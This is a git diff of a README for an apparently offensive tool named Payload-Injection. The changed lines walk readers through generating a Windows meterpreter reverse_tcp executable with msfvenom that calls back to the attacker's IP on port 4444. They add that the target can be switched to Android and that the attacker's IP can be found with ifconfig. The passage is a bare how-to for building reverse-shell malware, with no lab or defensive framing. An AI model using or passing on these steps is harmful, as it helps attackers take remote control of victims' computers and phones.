@@ -21,11 +21,13 @@ git clone https://github.com/Essam0o/Payload-Injection.git
 --------------------------------------------------------------------------------------------
 After preparing your payload via Payload-injection tool you can open msfconsole and lunch your paylaod which has been created open your terminal as a root in any path and type
 
-sodu su  
-
+**sudo su**
 
 **msfvenom -p windows/meterpreter/reverse_tcp -f exe lhost = your ip lport = 4444 > FileName .exe**
 
+if you build up a paylaod for android you will change the windows to android and so on 
+
+u can get your ip from terminal type **sudo ifconfig**
 
 Then wait to complete download the file and check your path on your os
   
